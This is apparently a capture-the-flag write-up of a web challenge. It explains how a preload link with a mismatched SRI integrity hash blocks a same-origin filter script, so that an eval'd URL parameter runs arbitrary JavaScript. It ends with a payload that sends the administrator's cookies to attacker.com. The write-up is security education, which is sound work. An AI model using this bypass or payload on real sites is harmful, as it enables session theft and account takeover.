## Write-up
 
### How it works?

The challenge's website is concise and you don't have much to work on:

1. There is a place to report a link to the administrator (which must be prefixed with http://165.227.115.65/ - the challenge's IP).
2. There is a `calc` parameter which is being filtered by an external script file (which is same-origin to the challenge's page) and then is being eval'd.
3. There is a `xss` parameter that is being reflected at the end of the body.
4. The server uses a strict CSP, which doesn't allow you to use the injection to do much.

### Digging deeper

By looking into the external script file, it is possible to notice that the `calc` parameter is being filtered as soon as the DOM is loaded and only numbers, +, - are being allowed. The length of characters is also limited to 100.

```javascript
window.addEventListener('DOMContentLoaded', () => {
    let regex = /[^0-9\+\-]+/;
    if (calc.length > 100) calc = "1337";
    calc = calc.replace(/ /g, "+");
    if (regex.test(calc)) calc = "1337";
});
```
Also, by checking the script on the main page, you can see the parameter is only executed after the page is fully loaded - meaning that it will only be eval'd after the external script has a chance to filter the input it got from the `calc` parameter.

```javascript
let calc = new URL(location).searchParams.get("calc") || "1337";
onload = () => {
    alert(eval(calc));
}
```

After this assessment, one of the realizations is that if you are able to block the external script from loading, you can execute arbitrary javascript.

### Prior research

There has been some research on the subject of selectively blocking subresources (https://www.reddit.com/r/Slackers/comments/c1mpmq/selectively_blocking_subresources_when_xss/). 

But none of these prior researches would work in the context of this challenge.

The intended solution required you to find a way to block subresources that were being loaded after the injection point by only using HTML injection.

### Features created for good (or bad)

Before Chrome 77, it was not possible to do the preload of subresources that did an SRI verification without doing a double download of the same resource.

On Chrome 77, a new feature (https://www.chromestatus.com/feature/4967277059375104) was released which started allowing and honoring the integrity attribute on preload links.

It solved the problem of the double download, but created a new "problem" - if the hash on the integrity attribute doesn't match the real hash of the subresource, it will be blocked from loading :)

### Payload

Knowing that it gets easy to construct a payload that will allow executing arbitrary javascript and stealing the administrator's cookies:

```
http://165.227.115.65/?xss=<link+rel=preload+as=script+integrity=sha256-1+href=filter.js>&calc=location=`//attacker.com/?${document.cookie}`
```
